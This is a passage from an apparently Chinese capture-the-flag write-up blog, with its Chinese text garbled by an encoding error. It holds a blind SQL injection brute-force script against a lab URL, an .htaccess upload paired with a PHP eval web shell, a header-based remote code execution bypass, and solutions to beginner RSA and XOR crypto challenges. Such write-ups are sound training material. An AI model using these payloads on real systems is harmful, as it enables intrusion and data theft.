class="string">&quot;http://1f2edf21-fa95-4d74-8410-ad4faffbfb07.node4.buuoj.cn:81/?id=TMP0929&quot;</span>+char)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> <span class="string">&#x27;no!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;é€šè¿‡: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥æ‰€éœ€æ¨¡å—</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ å­—æ¯è¡¨ï¼Œæ ¹æ®å­—æ¯è¡¨å»çˆ†ç ´æ¯ä¸€ä½çš„å…·ä½“å€¼</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;-,&#125;&#123;_=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alphabet)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢˜ç›®çš„URL</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8c704eaf-a795-49b7-9951-a7b2f4811142.node4.buuoj.cn:81/?id=TMP0929&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å…¥ä»€ä¹ˆæ•°æ®ï¼Œselectå˜é‡å°±å†™ä»€ä¹ˆå­æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span> <span class="comment">#è·å–æ‰€æœ‰åº“å</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span> <span class="comment">#è·å–è¡¨å</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;here_is_flag&#x27;&quot;</span><span class="comment">#è·å–å­—æ®µå</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select flag from ctf.here_is_flag&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æ¥ä¿å­˜æ³¨å…¥å‡ºçš„ç»“æœ</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># å¤–å±‚å¾ªç¯ï¼Œä»1å¼€å§‹ï¼Œå› ä¸ºæˆªå–çš„ä½æ•°æ˜¯ä»1å¼€å§‹çš„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># å†…å±‚å¾ªç¯ï¼Œæ˜¯å…·ä½“éœ€è¦æµ‹è¯•çš„å€¼</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ„é€ SQLè¯­å¥ï¼Œå‘èµ·è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment">#payload = f&quot;&#x27; AND subStr((selEct database()) ,&#123;i&#125;,1) = &#x27;&#123;ch&#125;&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  payload = <span class="string">f&quot;&#x27; AND subStr((SELECT flag FROM here_is_flag) ,<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  r = requests.get(url=url+payload)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ ¹æ®å›æ˜¾åˆ¤æ–­ï¼Œå¦‚æœå¾—åˆ°äº†è¡¨ç¤ºæŸ¥è¯¢æˆåŠŸçš„å›æ˜¾ï¼Œé‚£ä¹ˆè¯´æ˜åˆ¤æ–­æ•°æ®çš„è¿™ä¸€ä½æ˜¯æ­£ç¡®çš„</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">ord</span>(ch) &lt; <span class="number">66</span> :  <span class="comment">#buuæœ‰429  sleepä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="string">&quot;class_name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  result += ch</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;æ³¨å…¥æˆåŠŸï¼š&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(url+payload)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span> <span class="comment"># è¿™ä¸€ä½å·²ç»è·‘å‡ºæ¥äº†ï¼Œå¯ä»¥breakæ‰ç„¶åä¸‹ä¸€è½®å¾ªç¯è·‘ä¸‹ä¸€ä½æ•°æ®äº†</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># å¦‚æœå·²ç»è·‘åˆ°äº†å­—æ¯è¡¨æœ€åä¸€ä½éƒ½è¿˜æ²¡æœ‰è¿›åˆ°ä¸Šé¢çš„ifç„¶åbreakï¼Œè¯´æ˜è¿™è½®å¾ªç¯æ²¡è·‘å‡ºæ¥æ­£ç¡®ç»“æœï¼Œè¯´æ˜æ³¨å…¥å®Œæˆï¼ˆæˆ–è€…æ³¨å…¥payloadå†™çš„æœ‰é—®é¢˜æ³¨å…¥å¤±è´¥ï¼‰ï¼Œè„šæœ¬æ²¡å¿…è¦ç»§ç»­è·‘ä¸‹å»äº†</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># if ch == alphabet[-1]:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  print(&quot;æ³¨å…¥å®Œæˆ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  exit(0)</span></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010165429.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-Upload-again"><a href="#WEEK2-WEB-Upload-again" class="headerlink" title="WEEK2|WEB  Upload again!"></a>WEEK2|WEB  Upload again!</h5><p>ç™½åå•ï¼Œç›´æ¥ç©¿htaccess,åŒ…å«å³å¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;.htaccess&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;g&#x27;]);&lt;/script&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010212627.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-R-C-E"><a href="#WEEK2-WEB-R-C-E" class="headerlink" title="WEEK2|WEB  R!!C!!E!!"></a>WEEK2|WEB  R!!C!!E!!</h5><p>æ‰«æç›®å½•å¾—åˆ°gitæ³„éœ²ï¼Œè®¿é—®/.git/indexå¾—åˆ°æºç ï¼Œæ‰“å¼€ä¹±ç ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°bo0g1pop.php<br><img src="/images/xinshengsai/20231011093422.png" alt="image-20220126203415648"><br>è®¿é—®ä¸€ä¸‹ï¼Œæ— å‚æ•°rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span>Â (<span class="string">&#x27;;&#x27;</span>Â ===Â preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,Â <span class="string">&#x27;&#x27;</span>,Â <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))Â &#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤getallheaders,ç›´æ¥ç”¨è¿™ä¸ª<br>GET /bo0g1pop.php?star=print_r(getallheaders());<br>å…ˆè¾“å‡ºæ‰€æœ‰çš„header<br><img src="/images/xinshengsai/20231011105148.png" alt="image-20220126203415648"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</span><br><span class="line">current() -è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‘ä¸€ä¸‹ä¸Šé¢é‚£ä¸ªæŒ‡å‘æ•°ç»„çš„æ²¡æœ‰è¢«banï¼Œä½¿ç”¨next<br><img src="/images/xinshengsai/20231011105427.png" alt="image-20220126203415648"><br>ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºäº†uaï¼Œé‚£è°ƒç”¨è¿™ä¸ªuaï¼Œæ¶æ„ä¼ å‚å³å¯ï¼ŒæŠŠprintæ”¹æˆeval<br>/bo0g1pop.php?star=eval(next(getallheaders()));<br><img src="/images/xinshengsai/20231011105540.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231011105651.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-brainfuck"><a href="#WEEK1-CRYPTO-brainfuck" class="headerlink" title="WEEK1|CRYPTO brainfuck"></a>WEEK1|CRYPTO brainfuck</h5><p>éšæ³¢é€æµå³å¯<br><img src="/images/xinshengsai/20231010165600.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Caesarâ€™s-Secert"><a href="#WEEK1-CRYPTO-Caesarâ€™s-Secert" class="headerlink" title="WEEK1|CRYPTO Caesarâ€™s Secert"></a>WEEK1|CRYPTO Caesarâ€™s Secert</h5><p><img src="/images/xinshengsai/20231010165735.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Fence"><a href="#WEEK1-CRYPTO-Fence" class="headerlink" title="WEEK1|CRYPTO Fence"></a>WEEK1|CRYPTO Fence</h5><p><img src="/images/xinshengsai/20231010165811.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Vigenere"><a href="#WEEK1-CRYPTO-Vigenere" class="headerlink" title="WEEK1|CRYPTO VigenÃ¨re"></a>WEEK1|CRYPTO VigenÃ¨re</h5><p><code>https://www.guballa.de/vigenere-solver</code><br><img src="/images/xinshengsai/20231013160101.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyencoding"><a href="#WEEK1-CRYPTO-babyencoding" class="headerlink" title="WEEK1|CRYPTO babyencoding"></a>WEEK1|CRYPTO babyencoding</h5><p>base64<br><img src="/images/xinshengsai/20231013161304.png" alt="image-20220126203415648"><br>base32<br><img src="/images/xinshengsai/20231013161544.png" alt="image-20220126203415648"><br>uuencode<br><a href="http://www.atoolbox.net/Tool.php?Id=731">http://www.atoolbox.net/Tool.php?Id=731</a><br><img src="/images/xinshengsai/20231013161254.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Small-d"><a href="#WEEK1-CRYPTO-Small-d" class="headerlink" title="WEEK1|CRYPTO  Small d"></a>WEEK1|CRYPTO  Small d</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>eå¾ˆå¤§ï¼Œç»´çº³æ”»å‡»<br><img src="/images/xinshengsai/20231013162824.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyrsa"><a href="#WEEK1-CRYPTO-babyrsa" class="headerlink" title="WEEK1|CRYPTO babyrsa"></a>WEEK1|CRYPTO babyrsa</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)  <span class="comment">#32ä½n</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†nè¿›è¡Œåˆ†è§£<br><img src="/images/xinshengsai/20231020100522.png" alt="image-20220126203415648"><br>æ ¹æ®ä»£ç å¾—åˆ°ï¼Œnæ˜¯15ä¸ªç´ æ•°ç›¸ä¹˜å¾—æ¥çš„ï¼Œé‚£ä¹ˆï¼Œfnå°±çš„æ‰€æœ‰ç´ æ•°-1ç„¶åç›¸ä¹˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> distutils.util <span class="keyword">import</span> run_2to3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2 Â  Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p=<span class="number">2217990919</span></span><br><span class="line"></span><br><span class="line">q=<span class="number">2338725373</span></span><br><span class="line"></span><br><span class="line">r3=<span class="number">2370292207</span></span><br><span class="line"></span><br><span class="line">r4=<span class="number">2463878387</span></span><br><span class="line"></span><br><span class="line">r5=<span class="number">2706073949</span></span><br><span class="line"></span><br><span class="line">r6=<span class="number">2794985117</span></span><br><span class="line"></span><br><span class="line">r7=<span class="number">2804303069</span></span><br><span class="line"></span><br><span class="line">r8=<span class="number">2923072267</span></span><br><span class="line"></span><br><span class="line">r9=<span class="number">2970591037</span></span><br><span class="line"></span><br><span class="line">r10=<span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">r11=<span class="number">3654864131</span></span><br><span class="line"></span><br><span class="line">r12=<span class="number">3831680819</span></span><br><span class="line"></span><br><span class="line">r13=<span class="number">3939901243</span></span><br><span class="line"></span><br><span class="line">r14=<span class="number">4093178561</span></span><br><span class="line"></span><br><span class="line">r15=<span class="number">4278428893</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q*r3 *r4 *r5 *r6 *r7 *r8*r9*r10*r11*r12*r13*r14*r15</span><br><span class="line"></span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r3-<span class="number">1</span>)*(r4-<span class="number">1</span>)*(r5-<span class="number">1</span>)*(r6-<span class="number">1</span>)*(r7-<span class="number">1</span>)*(r8-<span class="number">1</span>)*(r9-<span class="number">1</span>)*(r10-<span class="number">1</span>)*(r11-<span class="number">1</span>)*(r12-<span class="number">1</span>)*(r13-<span class="number">1</span>)*(r14-<span class="number">1</span>)*(r15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> Â </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># invertæ˜¯æ±‚ä¹˜æ³•é€†å…ƒ Â  Â </span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(d))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,<span class="built_in">int</span>(d),n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-babyxor"><a href="#WEEK1-CRYPTO-babyxor" class="headerlink" title="WEEK1|CRYPTO  babyxor"></a>WEEK1|CRYPTO  babyxor</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from secret import *</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment"># Â  Â  ciphertext.append(f ^ key)</span></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Â binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> s[<span class="number">0</span>]^j == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(j)</span><br><span class="line"><span class="comment">#å…ˆç”¨ç¬¬ä¸€ä¸ªe9äº¦æˆ–1-255ï¼Œå¾—å‡ºkeyï¼Œkeyä¸º143ï¼Œåœ¨æ‰€æœ‰çš„éƒ½äº¦æˆ–14</span></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span 